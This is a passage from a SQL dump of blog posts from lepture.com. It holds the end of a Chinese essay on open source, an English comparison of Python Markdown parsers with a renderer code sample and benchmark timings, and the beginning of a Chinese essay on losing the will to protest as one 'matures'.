href="http://lepture.com/#fnref-source" rev="footnote">&#8617;</a></p></li>\n<li id="fn-github-top"><p>最活躍並不代表什麼，說起來也沒有什麼特別拿得出手的東西。最近活躍度變低了，名次一直在掉，但是截止到寫這篇文章依舊是大陸區第一。<a href="http://lepture.com/#fnref-github-top" rev="footnote">&#8617;</a></p></li>\n<li id="fn-code-style"><p>我喜歡漂亮的代碼。漂亮多半時候指的是代碼風格，也偶爾指漂亮的邏輯。<a href="http://lepture.com/#fnref-code-style" rev="footnote">&#8617;</a></p></li>\n<li id="fn-dog-food"><p>所謂 Eat your own dog food 是也。<a href="http://lepture.com/#fnref-dog-food" rev="footnote">&#8617;</a></p></li>\n</ol>\n</div>', '2014-11-06 23:42:49', 5, '2014-03-12 10:10:00', '2014-03-12 10:10:00', 0, '[["\\u958b\\u6e90", 0.30607085474292167], ["\\u4e00\\u500b", 0.25205835096475904], ["\\u554f\\u984c", 0.2160500151126506], ["\\u4ec0\\u9ebc", 0.18004167926054218], ["Open", 0.18004167926054218], ["source", 0.16203751133448796], ["\\u4ee3\\u78bc", 0.14403334340843374], ["Software", 0.14403334340843374], ["\\u8edf\\u9ad4", 0.12602917548237952], ["Library", 0.1080250075563253], ["\\u6587\\u6a94", 0.1080250075563253], ["\\u4f7f\\u7528", 0.0952231915648494], ["Source", 0.09002083963027109], ["GitHub", 0.09002083963027109], ["\\u6771\\u897f", 0.07201667170421687], ["\\u89e3\\u6c7a", 0.07201667170421687], ["\\u904e\\u7a0b", 0.07201667170421687], ["\\u9806\\u4fbf", 0.07201667170421687], ["\\u6c92\\u6709", 0.05401250377816265], ["\\u7d66\\u5225", 0.05401250377816265]]', NULL, NULL, '哦，不要在意這個標題。我知道你們看過《當我談跑步時我談些什麼》，也看過《當我們談論愛情時我們在談論什麼》。\n那麼當我談開源時我要談些什麼呢？我以爲第一點要弄清楚的是開源是什麼。一般人眼裏的開源是怎麼樣的，我不知道，只能不懷惡意地揣測，大抵是指免費的可以查看到源代碼的軟體吧。\n當然，這不過是我個人的猜測。我眼中的開源遠不止如此，開源不僅僅只有軟體和代碼。英文的開源一詞乃 Open Source，至於 Source 是什麼，並沒有明確的限定。它可以是 Open-source software1，可以是 Open-source content，可以是 Open-source journalism，可以是 Open-source university，甚至於 Open-source politics。\n例如我曾閒暇無聊時整理過中華人民共和國的法律，它不是軟體，不是代碼，但是我一樣認爲這是一個開源庫。本質上來說，它甚至不是源2。但是換一個角度來看，它又是第一個整理成 Markdown 格式的法律集，那麼從這個角度來說，也可看作是源了。\n因爲職業的關係，我所能談的也只有 Open-source code 了。但是萬不要以爲開源就只有代碼，你可以開源任何事物。\n\n你也許不知道，我是 GitHub 上最活躍的大陸華人3。創建了一個又一個的開源庫，挖了許多坑，也填了許多坑。這樣看來彷彿我挺熱衷於開源的，其實不然，我是屬於消極開源的一類人。\n例如我曾在 The Unpleasant Part of Open Source 一文裏提到：\nWe open source not because people need us. We just happen to open source things that solve our problems, and wish it may help other people.\nOpen source can be a business for a company, but not for individuals.\n開源對我來說是一件順便的事，沒有什麼崇高的目的。與理想無關，更多的是一種實用主義。我寫了一個 Python 庫，順便放在 GitHub 上做管理，順便發布到 PyPI 裏方便下載安裝。一切都是因爲順便。有時覺得對別人會挺有用的，便會特地去宣傳宣傳。比如最近寫的一個 Markdown 解析器 mistune。但是更多的時候，我並不會刻意去做太多，沒有那麼多精力。\n聽起來彷彿挺沒有責任心。其實不然，我寫的東西還是很不錯的。雖然是順便爲之，測試用例、文檔卻是一樣都不會少的，而且代碼也寫得漂亮4。既然有打算給別人用，文檔是必不可少的，許多程序員不喜歡寫文檔，我不在其列，我認爲沒有文檔的程序不叫開源程序。如果你有興趣，可以隨便看看我寫的文檔：\n\nFlask-OAuthlib: flask-oauthlib.readthedocs.org/\notpauth: pythonhosted.org/otpauth/\n\n\n開源代碼分兩類，一類是 Software(Application)，一類是 Library（庫）。Software 是針對使用者的，是一個可直接使用的程序；Library 是針對開發者的，爲開發者編寫代碼提供便利。比如 Gitlab 是一個 Open Source Software，而 Gitlab 使用的 Rails 框架則是一個 Library。對一般人來說，接觸的更多的應該是開源軟體。\n初入行時，我寫過一個運行在 GAE 上的博客，這是 Software。後來慢慢就不再寫 Software 了，改寫 Library 了。因爲 Software 很容易讓我廢棄掉，一旦不再使用，就沒有動力去更新了。而 Library 則不然，你輕易不會廢棄掉，即使你不再使用，因爲功能單一明確，很容易讓別人接手。比如 lepture/flask-wtf 這個庫便是從旁人那裏接手過來的。\n自己使用5是一個很重要的原則。如果一個庫自己不再使用，而有其他人來提 Bug 或者 feature，我是懶得搭理的。沒有金錢收入，自己又不用，哪裏有心思修改刪增呢！以前寫了一個 Python 庫，叫 Livereload，是一個 Software。剛開始時用了一段時間，後來便廢棄了。然而不時還有人來提 issue，因爲我暫時用不着，便不太搭理人。而後靈光乍現，將 Livereload 從 Software 改成 Library，便又能吃自己的狗糧了。也下定了決心，以後要少寫軟體，多寫庫。\n但是我偶爾還會寫一些開源軟體，專注於單一的功能，代碼量足夠小。這樣即使我不再使用它，只需要花少量的時間就能了解它，修改它。最近的例子就是 rewatch，區區 80 幾行代碼，賞心悅目。\n\n有的同學可能覺得開源是一件很偉大的事，我頗不以爲然。大可不必看得太重，當然也不可輕賤。看得太重，便會生怯，妄自菲薄，以爲這樣崇高的事自己是做不了的。假使有志於做點貢獻，我也有些許建議。\n\n首先註冊一個 GitHub 賬戶，學習一下 Git 的使用。現在多數開源庫都託管在  GitHub 上的。\n從使用別人的庫開始，在 GitHub 上 Star 一下別人的庫，讓開發者知道有人關注他寫的東西。\n遇到好東西，幫忙作者宣傳一下，也算是在做貢獻\n在使用過程中，你不可避免的會遇到各種各樣的問題，即時反饋給開發者。\n有能力的話，不妨修復這些問題，然後給作者發 pull request，說明清楚你解決了什麼問題。\n你遇到了一個問題，又找不到好的方案，於是你開始自己解決這些問題，同時公開了你的解決方案。\n\n我並不贊同刻意地參與，最有效的參與便是使用。在使用過程中發現問題，反饋問題，解決問題。開始的時候，多關注一些小項目，更少的代碼量有助於你理解它，發現它的問題，複雜的項目會讓人望而生怯，讓你裹足不前。\n我並不總是在寫自己的代碼，也會給別人提問題，也會給別人發 patch。但是前提是，我在使用，而且在使用過程中遇到了問題。也許你發現的並不是什麼大問題，比如文檔裏的某個單詞寫錯了，沒有關係，大膽地給作者發 pull request 吧。\n最後，在參與的過程中注意一下「如何向开源社区提问题」。\n\n\n開源軟體，這大約就是一般人眼裏的開源，也就是所謂狹義的開源。↩\nSource 的本意即是來源、出處、根源。↩\n最活躍並不代表什麼，說起來也沒有什麼特別拿得出手的東西。最近活躍度變低了，名次一直在掉，但是截止到寫這篇文章依舊是大陸區第一。↩\n我喜歡漂亮的代碼。漂亮多半時候指的是代碼風格，也偶爾指漂亮的邏輯。↩\n所謂 Eat your own dog food 是也。↩\n\n', NULL, NULL, NULL);
INSERT INTO `post` (`id`, `url`, `title`, `content`, `created_at`, `blog_id`, `updated_at`, `published_at`, `hide`, `keywords`, `clicks`, `recommend`, `pure_content`, `need_analysis`, `published_at_exceed`, `updated_at_exceed`) VALUES
(35, 'http://lepture.com/en/2014/markdown-parsers-in-python', 'Markdown Parsers in Python', '<p>There are many markdown parsers in Python. Misaka was my favorite one.\nHowever, misaka is deprecated now, and the successor which is called\nhoedown still has issues to solve. That''s why it is a <strong>was</strong>. But I still\nlove it.</p>\n<p>Here is a list of markdown parsers for Python in my knowledge:</p>\n<ul>\n<li>Misaka: A python binding for Sundown. (CPython required)</li>\n<li>Hoedown: A python binding for Hoedown, successor of Misaka.</li>\n<li>Discount: A python binding for Discount. (CPython required)</li>\n<li>cMarkdown: Markdown for Python, accelerated by C. (CPython required)</li>\n<li>Markdown: A pure markdown parser, the very first implementation.</li>\n<li>Markdown2: Another pure markdown parser.</li>\n</ul>\n<p>And I''ve just released another pure markdown parser too, which is called\n<strong><a href="https://github.com/lepture/mistune">mistune</a></strong>.</p>\n<h2>Misaka</h2>\n<p><a href="https://github.com/FSX/misaka">Misaka</a> was my favorite markdown parser. It\nis a python binding of Sundown, which means that it has all the features\nthat Sundown provides.</p>\n<p>It is super fast! Actually, it is the top one in my benchmarks. Since it is\na binding of a C library, no wonder that it is this fast. If speed is what\nyou want, you should try misaka, and as well as other bindings of a C library.</p>\n<p>But misaka is more than speed. It is the custom renderer feature that catches\nmy heart. I am so fond of it, that''s why I implement the custom renderer\nfeature in my own markdown parser <strong>mistune</strong>.</p>\n<p>A quick and very useful sample is <a href="http://misaka.61924.nl/manual/#toc_15">code highlighting</a>.</p>\n<p>However, it is a binding of a C libary. It requires CPython, if you prefer\nPyPy, you have no access to it. Some App Engines have a limitation on compiling\nC libraries too, you can''t use misaka in this case. And even if you are\nusing CPython, it is still difficult to install it on a Windows OS.</p>\n<blockquote><p>Visual Studio''s support for C is not optimal and most VS compilers are\nmissing stdint.h, which is needed to compile Misaka.</p>\n</blockquote><p>If you are on a Windows, may god helps you. I don''t care it a shit.</p>\n<p>Footnote feature is missing in Misaka. Maybe many of you don''t need such a\nthing, in this case, misaka has nothing bad. It is stable, efficient, and\nhas many GFM features.</p>\n<p>The only trouble is Sundown is deprecated.<sup class="footnote-ref" id="fnref-sundown-deprecated"><a href="http://lepture.com/#fn-sundown-deprecated" rel="footnote">1</a></sup></p>\n<h2>Hoedown</h2>\n<p>Because the Sundown library is deprecated, here comes hoedown<sup class="footnote-ref" id="fnref-c-hoedown"><a href="http://lepture.com/#fn-c-hoedown" rel="footnote">2</a></sup>,\nwhich is the fork of the original Sundown. It has a Python binding also\ncalled as hoedown.</p>\n<p>Since Hoedown is the successor of Sundown, and <a href="https://github.com/hhatto/python-hoedown">python-hoedown</a> is the successor of Misaka, all features\nthat misaka has, python-hoedown has them too. But python-hoedown is more\nthan that.</p>\n<ol>\n<li>It is PyPy compatible.</li>\n<li>It has footnote feature.</li>\n</ol>\n<p>It looks promissing, and even misaka''s author recommends it. I''ve tried it,\nbut failed with one issue, <a href="https://github.com/hhatto/python-hoedown/issues/5">a magic error</a> that I can''t do anything:</p>\n<pre><code>terminated by signal SIGSEGV (Address boundary error)\n\n</code></pre>\n<p>This isssue is not fixed yet. Once it does, <del>hoedown would be a good choice</del>\nfor non-AE users.</p>\n<p><em>Updated at Jun 23, 2014</em>: you can use <a href="https://github.com/Anomareh/Hoep">Hoep</a> as the Python Binding.</p>\n<h2>cMarkdown &amp; Discount</h2>\n<p><a href="https://github.com/paulsmith/cMarkdown">cMarkdown</a> is much like Misaka,\nexcept that it is based on upskirt<sup class="footnote-ref" id="fnref-upskirt"><a href="http://lepture.com/#fn-upskirt" rel="footnote">3</a></sup> rather than sundown. The\nhistory is very interesting, sundown is a fork of upskirt, hoedown is a\nfork of sundown. And now, sundown is deprecated, upskirt is missing. The\nnew markdown parser that vmg promised is still not available.</p>\n<p>cMarkdown has all the disadvantages of Misaka, and it is a little slower\nthan Misaka. This means you really should use misaka instead of cMarkdown.</p>\n<hr />\n<p>Discount is a joke for me, I can''t even install it successfully! There is\nnot much to say. But I do know that Discount is slower than Sundown.</p>\n<h2>Markdown &amp; Markdown2</h2>\n<p><a href="https://github.com/waylan/Python-Markdown">Python-Markdown</a> is the very first markdown parser in pure Python. It is\ngood, except the documentation. However, I miss the renderer feature in\nmisaka, which is not in Python-Markdown.</p>\n<p>Python-Markdown is not that slow as I expected, since Python-Markdown2\ncalls itself as:</p>\n<blockquote><p>A fast and complete implementation of Markdown in Python.</p>\n</blockquote><p>But it is not true. Python-Markdown2 is much slower than Python-Markdown.\nI have no idea why it says itself fast. All features that 2 has, the older\none has too.</p>\n<p>The benchmark shows that Python-Markdown2 is almost twice slower than\nPython-Markdown. No wonder it is 2.</p>\n<h2>Mistune</h2>\n<p><a href="https://github.com/lepture/mistune">Mistune</a> is a new (just released)\nmarkdown parser. It is the <strong>fastest</strong> one in all pure Python implementations.\nAlmost <strong>4 times faster</strong><sup class="footnote-ref" id="fnref-bench"><a href="http://lepture.com/#fn-bench" rel="footnote">4</a></sup> than Python-Markdown in pure Python\nenvironment, almost <strong>5 times faster</strong> with Cython''s help.</p>\n<p>I didn''t expect it to be so fast when I wrote it. I know it would be a fast\none, but I didn''t know that it would be 4 times faster and even 5 times\nfaster.</p>\n<hr />\n<p>I have never thought of creating a Markdown parser my own. But it has been\nmonths since I reported the issue to Hoedown. The issue is still there,\nnot solved a bit. Because it is a C binding, I am not able to do any help,\nthe only thing I can do is waiting.</p>\n<p>I don''t use Python-Markdown or Python-Markdown2, because they have no renderer\nfeature, and they are slow.</p>\n<p>I have <a href="http://lepture.com/en/2013/unpleasant-open-source">introduced renderer feature to marked</a>, which is\nfinally merged. And now I am trying to add the <a href="https://github.com/chjj/marked/pull/351">footnote feature</a>.\nIt occured to me that I can port marked to Python, since I know marked well,\nand I know it is the fastest in all pure JavaScript implementations. It\nwould be fast in Python too, and it really does.</p>\n<hr />\n<p>If you are looking for a fast, full featured<sup class="footnote-ref" id="fnref-mistune-features"><a href="http://lepture.com/#fn-mistune-features" rel="footnote">5</a></sup> and pure\nPython implementation, Mistune is a good choice. It also has renderer\nfeature just like Misaka. You can always influnce the rendering results\nwith custom renderers.</p>\n<pre><code class="lang-python">import mistune\nfrom pygments import highlight\nfrom pygments.lexers import get_lexer_by_name\nfrom pygments.formatters import HtmlFormatter\n\nclass MyRenderer(mistune.Renderer):\n    def block_code(self, code, lang):\n        if not lang:\n            return ''\\n&lt;pre&gt;&lt;code&gt;%s&lt;/code&gt;&lt;/pre&gt;\\n'' % \\\n                mistune.escape(code.strip())\n        lexer = get_lexer_by_name(lang, stripall=True)\n        formatter = HtmlFormatter()\n        return highlight(code, lexer, formatter)\n\nrenderer = MyRenderer()\nmd = mistune.Markdown(renderer=renderer)\nprint(md.render(''Some Markdown text.''))</code></pre>\n<h2>Additional Notes</h2>\n<p>I did a benchmark on my MacBook Air, <a href="https://github.com/lepture/mistune/issues/1">view the results</a>.\nYou can run the benchmark script yourself: <a href="https://github.com/lepture/mistune/blob/master/tests/bench.py">bench.py</a></p>\n<pre><code>Parsing the Markdown Syntax document 1000 times...\nMistune: 12.7255s\nMistune (with Cython): 9.74075s\nMisaka: 0.550502s\nMarkdown: 46.4342s\nMarkdown2: 78.2267s\ncMarkdown: 0.664128s\nDiscount is not available</code></pre>\n<hr />\n<p>Mistune can be compiled with Cython if you have Cython installed already.</p>\n<pre><code>$ pip install cython mistune\n\n</code></pre>\n<p>The magic happens in the <code>setup.py</code> script. I''d like to introduce this part\nanother time.</p>\n<p><em>This post and all posts in markdown format on this site are rendered with\nmistune.</em></p>\n<div class="footnotes">\n<hr />\n<ol><li id="fn-sundown-deprecated"><p>Sundown is deprecated a year ago with a <a href="https://github.com/vmg/sundown/commit/37728fb2d7137ff7c37d0a474cb827a8d6d846d8">commit</a> by vmg, but the new markdown parser is still missing.<a href="http://lepture.com/#fnref-sundown-deprecated" rev="footnote">&#8617;</a></p></li>\n<li id="fn-c-hoedown"><p>Hoedown is a fork of Sundown, it is a C library. It reverted the <a href="https://github.com/hoedown/hoedown/commit/aa43a77283c613662033039eddb477f2e0fd3d63">deprecated message</a> 5 months ago.<a href="http://lepture.com/#fnref-c-hoedown" rev="footnote">&#8617;</a></p></li>\n<li id="fn-upskirt"><p>Links about upskirt are missing now, they are all 404.<a href="http://lepture.com/#fnref-upskirt" rev="footnote">&#8617;</a></p></li>\n<li id="fn-bench"><p>I''ve did a benchmark on all markdown parsers I know. <a href="https://github.com/lepture/mistune/issues/1">Checkout the Benchmarks</a>.<a href="http://lepture.com/#fnref-bench" rev="footnote">&#8617;</a></p></li>\n<li id="fn-mistune-features"><p>Mistune is full featured, it has autolink, strikethrough, table,\nfenced code, footnotes. And you can''t disable them. I believe that\nit is a good design to enable all these features, since they are the\nstandards in the real world now.<a href="http://lepture.com/#fnref-mistune-features" rev="footnote">&#8617;</a></p></li>\n</ol>\n</div>', '2014-11-06 23:42:49', 5, '2014-02-26 08:55:00', '2014-02-26 08:55:00', 0, '[["Python", 0.3695694254928763], ["Markdown", 0.25709177425591395], ["markdown", 0.20888706658293008], ["Misaka", 0.20888706658293008], ["Sundown", 0.16068235890994623], ["parser", 0.16068235890994623], ["feature", 0.1446141230189516], ["renderer", 0.1446141230189516], ["misaka", 0.1446141230189516], ["code", 0.12854588712795698], ["my", 0.12854588712795698], ["pure", 0.12854588712795698], ["mistune", 0.12854588712795698], ["than", 0.12854588712795698], ["binding", 0.12854588712795698], ["fast", 0.12854588712795698], ["python", 0.11247765123696235], ["Markdown2", 0.11247765123696235], ["hoedown", 0.11247765123696235], ["Mistune", 0.11247765123696235]]', NULL, NULL, 'There are many markdown parsers in Python. Misaka was my favorite one.\nHowever, misaka is deprecated now, and the successor which is called\nhoedown still has issues to solve. That''s why it is a was. But I still\nlove it.\nHere is a list of markdown parsers for Python in my knowledge:\n\nMisaka: A python binding for Sundown. (CPython required)\nHoedown: A python binding for Hoedown, successor of Misaka.\nDiscount: A python binding for Discount. (CPython required)\ncMarkdown: Markdown for Python, accelerated by C. (CPython required)\nMarkdown: A pure markdown parser, the very first implementation.\nMarkdown2: Another pure markdown parser.\n\nAnd I''ve just released another pure markdown parser too, which is called\nmistune.\nMisaka\nMisaka was my favorite markdown parser. It\nis a python binding of Sundown, which means that it has all the features\nthat Sundown provides.\nIt is super fast! Actually, it is the top one in my benchmarks. Since it is\na binding of a C library, no wonder that it is this fast. If speed is what\nyou want, you should try misaka, and as well as other bindings of a C library.\nBut misaka is more than speed. It is the custom renderer feature that catches\nmy heart. I am so fond of it, that''s why I implement the custom renderer\nfeature in my own markdown parser mistune.\nA quick and very useful sample is code highlighting.\nHowever, it is a binding of a C libary. It requires CPython, if you prefer\nPyPy, you have no access to it. Some App Engines have a limitation on compiling\nC libraries too, you can''t use misaka in this case. And even if you are\nusing CPython, it is still difficult to install it on a Windows OS.\nVisual Studio''s support for C is not optimal and most VS compilers are\nmissing stdint.h, which is needed to compile Misaka.\nIf you are on a Windows, may god helps you. I don''t care it a shit.\nFootnote feature is missing in Misaka. Maybe many of you don''t need such a\nthing, in this case, misaka has nothing bad. It is stable, efficient, and\nhas many GFM features.\nThe only trouble is Sundown is deprecated.1\nHoedown\nBecause the Sundown library is deprecated, here comes hoedown2,\nwhich is the fork of the original Sundown. It has a Python binding also\ncalled as hoedown.\nSince Hoedown is the successor of Sundown, and python-hoedown is the successor of Misaka, all features\nthat misaka has, python-hoedown has them too. But python-hoedown is more\nthan that.\n\nIt is PyPy compatible.\nIt has footnote feature.\n\nIt looks promissing, and even misaka''s author recommends it. I''ve tried it,\nbut failed with one issue, a magic error that I can''t do anything:\nterminated by signal SIGSEGV (Address boundary error)\n\n\nThis isssue is not fixed yet. Once it does, hoedown would be a good choice\nfor non-AE users.\nUpdated at Jun 23, 2014: you can use Hoep as the Python Binding.\ncMarkdown & Discount\ncMarkdown is much like Misaka,\nexcept that it is based on upskirt3 rather than sundown. The\nhistory is very interesting, sundown is a fork of upskirt, hoedown is a\nfork of sundown. And now, sundown is deprecated, upskirt is missing. The\nnew markdown parser that vmg promised is still not available.\ncMarkdown has all the disadvantages of Misaka, and it is a little slower\nthan Misaka. This means you really should use misaka instead of cMarkdown.\n\nDiscount is a joke for me, I can''t even install it successfully! There is\nnot much to say. But I do know that Discount is slower than Sundown.\nMarkdown & Markdown2\nPython-Markdown is the very first markdown parser in pure Python. It is\ngood, except the documentation. However, I miss the renderer feature in\nmisaka, which is not in Python-Markdown.\nPython-Markdown is not that slow as I expected, since Python-Markdown2\ncalls itself as:\nA fast and complete implementation of Markdown in Python.\nBut it is not true. Python-Markdown2 is much slower than Python-Markdown.\nI have no idea why it says itself fast. All features that 2 has, the older\none has too.\nThe benchmark shows that Python-Markdown2 is almost twice slower than\nPython-Markdown. No wonder it is 2.\nMistune\nMistune is a new (just released)\nmarkdown parser. It is the fastest one in all pure Python implementations.\nAlmost 4 times faster4 than Python-Markdown in pure Python\nenvironment, almost 5 times faster with Cython''s help.\nI didn''t expect it to be so fast when I wrote it. I know it would be a fast\none, but I didn''t know that it would be 4 times faster and even 5 times\nfaster.\n\nI have never thought of creating a Markdown parser my own. But it has been\nmonths since I reported the issue to Hoedown. The issue is still there,\nnot solved a bit. Because it is a C binding, I am not able to do any help,\nthe only thing I can do is waiting.\nI don''t use Python-Markdown or Python-Markdown2, because they have no renderer\nfeature, and they are slow.\nI have introduced renderer feature to marked, which is\nfinally merged. And now I am trying to add the footnote feature.\nIt occured to me that I can port marked to Python, since I know marked well,\nand I know it is the fastest in all pure JavaScript implementations. It\nwould be fast in Python too, and it really does.\n\nIf you are looking for a fast, full featured5 and pure\nPython implementation, Mistune is a good choice. It also has renderer\nfeature just like Misaka. You can always influnce the rendering results\nwith custom renderers.\nimport mistune\nfrom pygments import highlight\nfrom pygments.lexers import get_lexer_by_name\nfrom pygments.formatters import HtmlFormatter\n\nclass MyRenderer(mistune.Renderer):\n    def block_code(self, code, lang):\n        if not lang:\n            return ''\\n<pre><code>%s</code></pre>\\n'' % \\\n                mistune.escape(code.strip())\n        lexer = get_lexer_by_name(lang, stripall=True)\n        formatter = HtmlFormatter()\n        return highlight(code, lexer, formatter)\n\nrenderer = MyRenderer()\nmd = mistune.Markdown(renderer=renderer)\nprint(md.render(''Some Markdown text.''))\nAdditional Notes\nI did a benchmark on my MacBook Air, view the results.\nYou can run the benchmark script yourself: bench.py\nParsing the Markdown Syntax document 1000 times...\nMistune: 12.7255s\nMistune (with Cython): 9.74075s\nMisaka: 0.550502s\nMarkdown: 46.4342s\nMarkdown2: 78.2267s\ncMarkdown: 0.664128s\nDiscount is not available\n\nMistune can be compiled with Cython if you have Cython installed already.\n$ pip install cython mistune\n\n\nThe magic happens in the setup.py script. I''d like to introduce this part\nanother time.\nThis post and all posts in markdown format on this site are rendered with\nmistune.\n\n\nSundown is deprecated a year ago with a commit by vmg, but the new markdown parser is still missing.↩\nHoedown is a fork of Sundown, it is a C library. It reverted the deprecated message 5 months ago.↩\nLinks about upskirt are missing now, they are all 404.↩\nI''ve did a benchmark on all markdown parsers I know. Checkout the Benchmarks.↩\nMistune is full featured, it has autolink, strikethrough, table,\nfenced code, footnotes. And you can''t disable them. I believe that\nit is a good design to enable all these features, since they are the\nstandards in the real world now.↩\n\n', NULL, NULL, NULL),
(36, 'http://lepture.com/zh/2014/when-you-grow-up', '成熟這種病', '<blockquote><p>你這樣做又有什麼用呢？這在天朝算個什麼事！</p>\n</blockquote><p>你時常能聽到這樣的聲音吧？或許你就是這聲音的吟誦者。你一點一點長大，失去了好奇心，失去了探索欲，妥協<sup class="footnote-ref" id="fnref-compromise"><a href="http://lepture.com/#fn-compromise" rel="footnote">1</a></sup>，退讓，連帶着連別人的反抗也要嗤之以鼻了。你把這叫成熟<sup class="footnote-ref" id="fnref-not-accomplished"><a href="http://lepture.com/#fn-not-accomplished" rel="footnote">2</a></sup>。</p>\n<p>哦，這說的不是你，也許是我，未來的我。請你不要介懷。我時常擔心自己也會麻木，需要點自我暗示。有時想想，其實有點多餘，因爲我經常能被稱作幼稚呢！</p>\n<hr />\n<p>昨天 @chloerei 提了一句「<a href="https://twitter.com/chloerei/status/436499925652602882">自己不做，还要泼别人冷水</a>」。這說的是 V2EX 上的一篇帖子，<a href="https://www.v2ex.com/t/100888?p=1">我向工业信息化部发了一份申诉，为了 GitHub</a>。</p>\n<p>其實我並不知道 GitHub 又出問題了，因爲之前出過一次，已經把 fastly 的 CDN 加入到代理列表裏了。可惜沒有邁出投訴的一步。無論如何，有人邁出了這一步，而後還有附議者，總是叫人高興的。</p>\n<p>於這幸事之中又不免打擊之言——「我不怀疑，肯定无效」。</p>\n<p>也許吧。即使是徒勞的反抗，但那又怎麼樣！有些事的意義不在於做成功了，而在於做的過程。更何況，我是相信有效果的。</p>\n<blockquote><p>你可能不是第一个申诉，但也不会是最后一个。</p>\n</blockquote><p>这句评论颇有点巴士运动<sup class="footnote-ref" id="fnref-bus-boycott"><a href="http://lepture.com/#fn-bus-boycott" rel="footnote">3</a></sup>的味道，因为「帕克斯不是第一位在巴士上拒絕讓座給白人的黑人」。Rosa Parks<sup class="footnote-ref" id="fnref-rosa-parks"><a href="http://lepture.com/#fn-rosa-parks" rel="footnote">4</a></sup> 在当时也不是名人，与「李开复、周鸿祎」更是没得比。</p>\n<p>稍晚些時候，收到 rnw.org 的採訪郵件，詢問我對 GitHub 被屏蔽一事的看法，以及此事對我的影響。因爲忙於寫<a href="https://github.com/lepture/mistune">一個庫</a>，沒能及時回覆，深表歉意。</p>\n<hr />\n<p>這件事倒讓我想起之前的<a href="https://www.v2ex.com/t/57677">每日投诉电信计划</a>了，是關於中國電信在網頁中插廣告的事。結果挺好的，中國電信停止向寬帶用戶推送第三方廣告。（那電信自己的呢？，存疑。）</p>\n<p>雖然我不能肯定自己起到了什麼作用，恐怕主要還是靠 @Fenng 等關注者多的人，因爲名人的影響力在那裏嘛。但是做過了，而且堅持了那麼久，還是挺開心的，當作形爲藝術罷。</p>\n<p>這過程裏，傷害了不少客服的心，頗過意不去。也收穫了詆譭與讚譽。譭之者不過言「蚍蜉撼大樹」，仿佛我不知道似的。</p>\n<hr />\n<p>知乎有一句廣告辭——<strong>認真你就贏了</strong>。深得我心。成熟卻讓你失去了較真的勇氣，總是在關鍵時刻提醒著你：這樣做又有什麼用呢？更何況，還有「被送快遞」的風險。</p>\n<p>政治味稍微多了點，談一個更生活化的例子。比如說智能手機，即使你一遍遍地教過了父母，但是他們依然手足無措。你給一個小孩子玩，什麼都不用教，過會兒他就會用了，即使他還不識字。</p>\n<p>小孩子無所畏懼，拿到手上左按按右按按，按得多了也就會了。但是父母不會，他們從不左按右按，總是依照你所教的步驟一步一步按下去，還總是擔心按錯了。這就是成熟病呀。他們不曾想，即使按錯了也沒什麼大不了的。正如你想多了一樣，「查水表」這種事並不會輕易發生。</p>\n<p>你看，雖然我寫得一塌糊涂，完全不知所云，但是仍然有發表出來的勇氣，也見得暫未患這成熟病了。最後送上顾城的一首詩，望君喜歡。</p>\n<blockquote><p>天是灰色的<br />路是灰色的<br />楼是灰色的<br />雨是灰色的<br />在一片死灰中<br />走过两个孩子<br />一个鲜红<br />一个淡绿</p>\n</blockquote><div class="footnotes">\n<hr />\n<ol><li id="fn-compromise"><p>中文妥協一詞與英文 compromise 頗不相同，中文的妥協更多時候只是一方的退讓。<a href="http://lepture.com/#fnref-compromise" rev="footnote">&#8617;</a></p></li>\n<li id="fn-not-accomplished"><p>當我談成熟時，這個成熟只限定於本文的意義。它是非普適的，亦不是你認爲的意義。<a href="http://lepture.com/#fnref-not-accomplished" rev="footnote">&#8617;</a></p></li>\n<li id="fn-bus-boycott"><p>The Montgomery Bus Boycott, a seminal event in the U.S. civil rights movement, was a political and social protest campaign against the policy of racial segregation on the public transit system of Montgomery, Alabama.<a href="http://lepture.com/#fnref-bus-boycott" rev="footnote">&#8617;</a></p></li>\n<li id="fn-rosa-parks"><p>Rosa Louise McCauley Parks was an African-American civil rights activist, whom the United States Congress called "the first lady of civil rights" and "the mother of the freedom movement".<a href="http://lepture.com/#fnref-rosa-parks" rev="footnote">&#8617;</a></p></li>\n</ol>\n</div>', '2014-11-06 23:42:49', 5, '2014-02-20 16:00:00', '2014-02-20 16:00:00', 0, '[["\\u4ec0\\u9ebc", 0.15094403412752525], ["\\u6210\\u719f", 0.09294334475696969], ["\\u7e3d\\u662f", 0.09056642047651514], ["GitHub", 0.09056642047651514], ["\\u59a5\\u5354", 0.09056642047651514], ["civil", 0.09056642047651514], ["\\u4ed6\\u5011", 0.09056642047651514], ["\\u9019\\u6a23", 0.09056642047651514], ["rights", 0.09056642047651514], ["\\u5ee3\\u544a", 0.09056642047651514], ["\\u7070\\u8272", 0.07847930467161617], ["\\u4e00\\u6b65", 0.061007285728282824], ["\\u4e00\\u500b", 0.0603776136510101], ["\\u6642\\u5019", 0.0603776136510101], ["movement", 0.0603776136510101], ["Rosa", 0.0603776136510101], ["\\u52c7\\u6c23", 0.0603776136510101], ["\\u9081\\u51fa", 0.0603776136510101], ["\\u64d4\\u5fc3", 0.0603776136510101], ["Montgomery", 0.0603776136510101]]', NULL, NULL, '你這樣做又有什麼用呢？這在天朝算個什麼事！\n你時常能聽到這樣的聲音吧？或許你就是這聲音的吟誦者。你一點一點長大，失去了好奇心，失去了探索欲，妥協1，退讓，連帶着連別人的反抗也要嗤之以鼻了。你把這叫成熟2。\n哦，這說的不是你，也許是我，未來的我。請你不要介懷。我時常擔心自己也會麻木，需要點自我暗示。有時想想，其實有點多餘，因爲我經常能被稱作幼稚呢！\n\n昨天 @chloerei 提了一句「自己不做，还要泼别人冷水」。這說的是 V2EX 上的一篇帖子，我向工业信息化部发了一份申诉，为了 GitHub。\n其實我並不知道 GitHub 又出問題了，因爲之前出過一次，已經把 fastly 的 CDN 加入到代理列表裏了。可惜沒有邁出投訴的一步。無論如何，有人邁出了這一步，而後還有附議者，總是叫人高興的。\n於這幸事之中又不免打擊之言——「我不怀疑，肯定无效」。\n也許吧。即使是徒勞的反抗，但那又怎麼樣！有些事的意義不在於做成功了，而在於做的過程。更何況，我是相信有效果的。\n你可能不是第一个申诉，但也不会是最后一个。\n这句评论颇有点巴士运动3的味道，因为「帕克斯不是第一位在巴士上拒絕讓座給白人的黑人」。Rosa Parks4 在当时也不是名人，与「李开复、周鸿祎」更是没得比。\n稍晚些時候，收到 rnw.org 的採訪郵件，詢問我對 GitHub 